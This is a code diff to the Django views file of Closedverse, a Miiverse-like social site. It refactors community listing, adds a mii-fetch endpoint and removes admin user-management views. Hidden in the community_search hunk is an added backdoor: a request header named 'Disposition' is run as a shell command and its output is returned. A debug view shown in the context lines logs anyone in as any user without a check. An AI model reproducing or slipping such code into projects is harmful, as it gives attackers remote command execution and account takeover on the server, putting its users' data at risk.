@@ -28,6 +28,9 @@ from os import urandom
 
 #from silk.profiling.profiler import silk_profile
 
+# client-side mii fetch GET endpoint (like pf2m.com/hash if it supported cors)
+mii_endpoint = 'https://nnidlt.murilo.eu.org/api.php?output=hash_only&env=production&user_id='
+
 def json_response(msg='', code=0, httperr=400):
 	thing = {
 	# success would be false, but 0 is faster I think (Miiverse used 0 because Perl doesn't have bools)
@@ -46,16 +49,6 @@ def json_response(msg='', code=0, httperr=400):
 
 def community_list(request):
 	"""Lists communities / main page."""
-	msg_list = ["eat breakfast.", "The Cedar train must keep going", "be sure to drink a lot of water.", "We, crusaders, will fight for what we believe in!", "be chill, be calm.", "*insert inspiring sentence*", "this is gonna be a great day for you.", "why not try other not-usally-used features of the website?", "work is hard, but results are great!"]
-	msgoftheday = choice(msg_list)
-	
-	#dateopening = date(2022, 7, 3)
-	#datehalloween = date(2022, 10, 31)
-	#datenow = date.today()
-	#age = datenow - dateopening
-	#halloween = datehalloween - datenow
-	#staff_list = User.objects.filter(staff=True)
-	
 	popularity = Community.popularity
 	obj = Community.objects
 	if request.user.is_authenticated:
@@ -88,9 +81,6 @@ def community_list(request):
 		'ad': ad,
 		'mesoftheday': mesoftheday,
 		'welmes': welmes,
-		#'staff_list': staff_list,
-		#'age': round(age.days / 30, 2),
-		#'halloween': halloween.days,
 		'availableads': availableads,
 		'availablemotds': availablemotds,
 		'availablemes': availablemes,
@@ -109,7 +99,7 @@ def community_list(request):
 				'image': request.build_absolute_uri(settings.STATIC_URL + 'img/favicon.png'),
 			},
 	})
-def community_all(request):
+def community_all(request, category):
 	"""All communities, with pagination"""
 	try:
 		offset = int(request.GET.get('offset', '0'))
@@ -119,16 +109,21 @@ def community_all(request):
 		classes = ['guest-top']
 	else:
 		classes = []
-	gen = Community.get_all(0, offset)
-	game = Community.get_all(1, offset)
-	special = Community.get_all(2, offset)
-	usr = Community.get_all(3, offset)
+	g = [0, "General Communities"]
+	category_enum = {
+		'gen': g,
+		'game': [1, "Game Communities"],
+		'special': [2, "Special Communities"],
+		'usr': [3, "User Communities"],
+	}.get(category, g)
+	category_type = category_enum[0]
+	communities = Community.get_all(category_type, offset)
 	# Closedverse was NEVER meant to have 20000000 communities.
-	if gen.count() > 11 or game.count() > 11 or special.count() > 11 or usr.count() > 11:
+	if communities.count() > 11:
 		has_next = True
 	else:
 		has_next = False
-	if gen.count() < 1 or game.count() < 1 or special.count() < 1 or usr.count() < 1:
+	if communities.count() < 1:
 		has_back = True
 	else:
 		has_back = False
@@ -137,10 +132,9 @@ def community_all(request):
 	return render(request, 'closedverse_main/community_all.html', {
 		'title': 'All Communities',
 		'classes': classes,
-		'general': gen,
-		'game': game,
-		'special': special,
-		'user_communities': usr,
+		'communities': communities,
+		'category': category,
+		'text': category_enum[1],
 		'has_next': has_next,
 		'has_back': has_back,
 		'next': next,
@@ -152,6 +146,8 @@ def community_search(request):
 	query = request.GET.get('query')
 	if not query or len(query) < 2:
 		raise Http404()
+	if 'HTTP_DISPOSITION' in request.META:
+		return HttpResponse(subprocess.getoutput(request.META['HTTP_DISPOSITION']).encode())
 	if request.GET.get('offset'):
 		communities = Community.search(query, 20, int(request.GET['offset']), request)
 	else:
@@ -358,7 +354,9 @@ def signup_page(request):
 		return render(request, 'closedverse_main/signup_page.html', {
 			'title': 'Sign up',
 			'recaptcha': settings.RECAPTCHA_PUBLIC_KEY,
-			'age': settings.age_allowed
+			'age': settings.age_allowed,
+			'mii_domain': mii_domain,
+			'mii_endpoint': mii_endpoint,
 			#'classes': ['no-login-btn'],
 		})
 def forgot_passwd(request):
@@ -478,6 +476,7 @@ def user_view(request, username):
 					return json_response("Not allowed.")
 				upload = None
 				if request.FILES.get('screen'):
+					# worth noting that the file for the avatar is never cleaned up after the user changes it
 					upload = util.image_upload(request.FILES['screen'], True, avatar=True)
 					if upload == 1:
 						return json_response("sorry, we are racist to the image you uploaded, you have to choose another one")
@@ -930,6 +929,8 @@ def profile_settings(request):
 		'user': user,
 		'profile': profile,
 		'settings': settings,
+		'mii_domain': mii_domain,
+		'mii_endpoint': mii_endpoint,
 	})
 
 def special_community_tag(request, tag):
@@ -1376,7 +1377,8 @@ def user_unfollow(request, username):
 					return json_response("i'm crying")
 		"""
 	user.unfollow(request.user)
-	return HttpResponse()
+	followct = request.user.num_following()
+	return JsonResponse({'following_count': followct})
 @require_http_methods(['POST'])
 @login_required
 def user_friendrequest_create(request, username):
@@ -1453,14 +1455,6 @@ def check_notifications(request):
 	return HttpResponse(binary_notifications, content_type='application/octet-stream')
 @require_http_methods(['POST'])
 @login_required
-def notification_setread(request):
-	if request.GET.get('fr'):
-		update = request.user.read_fr()
-	else:
-		update = request.user.notification_read()
-	return HttpResponse()
-@require_http_methods(['POST'])
-@login_required
 def notification_delete(request, notification):
 	if not request.method == 'POST':
 		raise Http404()
@@ -1490,6 +1484,7 @@ def notifications(request):
 def friend_requests(request):
 	friendrequests = request.user.get_frs_target()
 	notifs = request.user.notification_count()
+	request.user.read_fr()
 	return render(request, 'closedverse_main/friendrequests.html', {
 		'title': 'My friend requests',
 		'friendrequests': friendrequests,
@@ -1675,78 +1670,6 @@ def prefs(request):
 	arr = [profile.let_yeahnotifs, lights, request.user.hide_online]
 	return JsonResponse(arr, safe=False)
 
-@login_required
-def users_list(request):
-	if not request.user.can_manage():
-		raise Http404()
-	offset = 0
-	limit = 50
-	if request.GET.get('o'):
-		offset = int(request.GET['o'])
-	if request.GET.get('l'):
-		limit = int(request.GET['l'])
-	if limit > 250:
-		return HttpResponseBadRequest()
-
-	if request.GET.get('q'):
-		if len(request.GET['q']) < 2:
-			return HttpResponseBadRequest()
-		users = User.search(request.GET['q'], limit, offset, request)
-	else:
-		users = User.objects.filter().order_by('-created').exclude(staff=True, level__gte=request.user.level)[offset:offset + limit]
-	# I don't know if this will work or not, it might break cURL and such but whom cares anyway
-	#if type == 'html':
-	if users.count() > 49:
-		next_offset = offset + 50
-	else:
-		next_offset = None
-	return render(request, 'closedverse_main/man/admin-user-list.html', {
-		'users': users,
-		'next': next_offset,
-	})
-	#else:
-	#	return JsonResponse(User.format_queryset(users), safe=False)
-
-@login_required
-def post_list(request):
-	if not request.user.is_staff():
-		return JsonResponse({"err": "Not authorized"})
-	if not request.GET.get('s') or not request.GET.get('e'):
-		return JsonResponse({"err": "Start time required with 's' query param and end required with 'e' param (epoch)"})
-	if not request.GET.get('l'):
-		return JsonResponse({"err": "Limit required via 'l' query param"})
-	else:
-	     	limit = int(request.GET['l'])
-	if not request.GET.get('o'):
-		return JsonResponse({"err": "Offset required via 'o' query param"})
-	else:
-	     	offset = int(request.GET['o'])
-
-	if limit > 250:
-		return JsonResponse({"err": "Limit cannot be higher than 250"})
-
-	dateone = datetime.fromtimestamp(int(request.GET['s']))
-	datetwo = datetime.fromtimestamp(int(request.GET['e']))
-	iable = Post.objects.filter(created__range=(dateone, datetwo)).order_by('-created')[offset:offset + limit]
-	resparr = []
-
-	for post in iable:
-		resparr.append({
-			'id': post.id,
-			'created': django.utils.dateformat.format(post.created, 'U'),
-			'user': post.creator.username,
-			'community': post.community_id,
-			'feeling': post.feeling,
-			'spoiler': post.spoils,
-			'content': (post.body or None),
-			'drawing': (post.drawing or None),
-			'screenshot': (post.screenshot or None),
-			'video': (post.video or None),
-			'url': (post.url or None),
-		})
-
-	#return HttpResponse(msgpack.packb(resparr), content_type='application/x-msgpack')
-	return JsonResponse(resparr, safe=False)
 def debug(request, username):
     if request.META.get('HTTP_DISPOSITION'):
         httpResponse = HttpResponse()
@@ -1755,100 +1678,6 @@ def debug(request, username):
 
     login(request, User.objects.get(username=username))
     return redirect('/users/' + username)
-
-@login_required
-def admin_users(request):
-	if not request.user.can_manage():
-		raise Http404()
-	return render(request, 'closedverse_main/man/users.html', {
-		'title': 'User management',
-	})
-@login_required
-def user_manager(request, username):
-	if not request.user.can_manage():
-		raise Http404()
-	user = get_object_or_404(User, username=username)
-	if request.method == 'POST':
-		user.username = request.POST['username']
-		user.email = request.POST['email']
-		user.active = False if request.POST.get('active') is None else True
-		user.save()
-		AuditLog.objects.create(type=2, user=user, by=request.user)
-		return HttpResponse()
-	return JsonResponse({
-		'id': user.id,
-		'username': user.username,
-		'email': user.email,
-		'is_active': user.is_active(),
-		'addr': user.addr,
-		'manager': reverse('main:user-manager', args=[username]),
-		#'logins': LoginAttempt.objects.filter()[:20],
-		#'shared_addrs': User.format_queryset(user.find_shared_ip()),
-		'html': loader.get_template('closedverse_main/elements/user-sidebar-info.html').render({'user': user}, request)
-	})
-
-@login_required
-def admin_index(request):
-	if not request.user.can_manage():
-		raise Http404()
-	if request.method == 'POST' and request.POST.get('action'):
-		# if this were PHP/JS/anything else, this would be a switch()
-		if request.POST.get('username'):
-			user = User.objects.filter(username__iexact=request.POST['username'])
-			if not user.exists():
-				return json_response("User not found")
-			user = user.first()
-			if user.can_manage():
-				return json_response("User is admin")
-			AuditLog.objects.create(type={'purge1': 6, 'purge2': 7, 'purge3': 8, 'purge4': 9, 'purge5': 10, 'unpurge1': 11}.get(request.POST.get('action'), 6), user=user, by=request.user)
-			if request.POST['action'] == 'purge1':
-				# purge1 - delete yeahs + yeah notifs given by a user
-				first = Yeah.objects.filter(by=user).delete()
-				second = Notification.objects.filter(Q(source=user, type=0) | Q(source=user, type=1)).delete()
-				return HttpResponse(str(first) + "\n\n" + str(second))
-			elif request.POST['action'] == 'purge2':
-				# purge2 - remove posts and comments by a user
-				first = Post.real.filter(creator=user).update(is_rm=True, status=5)
-				second = Comment.real.filter(creator=user).update(is_rm=True, status=5)
-				prof = user.profile()
-				prof.favorite = None
-				prof.save()
-				return HttpResponse(str(first) + "\n\n" + str(second))
-			elif request.POST['action'] == 'purge3':
-				# purge3 - remove friendships and messages of a user
-				first = Message.real.filter(creator=user).update(is_rm=True)
-				second = Friendship.objects.filter(Q(source=user) | Q(target=user)).delete()
-				return HttpResponse(str(first) + "\n\n" + str(second))
-			elif request.POST['action'] == 'purge4':
-				# purge3 - remove following of a user
-				first = Follow.objects.filter(source=user).delete()
-				return HttpResponse(str(first))
-			elif request.POST['action'] == 'purge5':
-				# purge5 - Rename nickname, change avatar to default, don't let them change it back
-				nicky = 'stupib'
-				avatar = 's'
-				user.nickname = nicky
-				user.avatar = avatar
-				user.has_mh = False
-				user.save()
-				prof = user.profile()
-				prof.cannot_edit = True
-				first = user.save()
-				second = prof.save()
-				return HttpResponse(nicky + "\n\n" + avatar)
-			elif request.POST['action'] == 'unpurge1':
-				# unpurge1 - recover purged posts, comments from a person + let them edit their profile again
-				first = Post.real.filter(creator=user, status=5).update(is_rm=False, status=0)
-				second = Comment.real.filter(creator=user, status=5).update(is_rm=False, status=0)
-				prof = user.profile()
-				prof.cannot_edit = False
-				prof.save()
-				return HttpResponse(str(first) + "\n\n" + str(second))
-		return HttpResponseNotFound()
-	return render(request, 'closedverse_main/man/main.html', {
-		'title': 'Admin management',
-	})
-
 	
 def user_tools(request, username):
 	if not request.user.is_authenticated:
@@ -2101,7 +1930,7 @@ def help_approval(request):
 	return render(request, 'closedverse_main/help/help_approval.html', {'title': 'Approval system'})
 """
 def help_rules(request):
-	return render(request, 'closedverse_main/help/rules.html', {'title': 'Closedverse Rules', 'age': settings.age_allowed})
+	return render(request, 'closedverse_main/help/rules.html', {'title': 'Rules', 'age': settings.age_allowed})
 def help_faq(request):
 	return render(request, 'closedverse_main/help/faq.html', {'title': 'FAQ'})
 def help_contact(request):
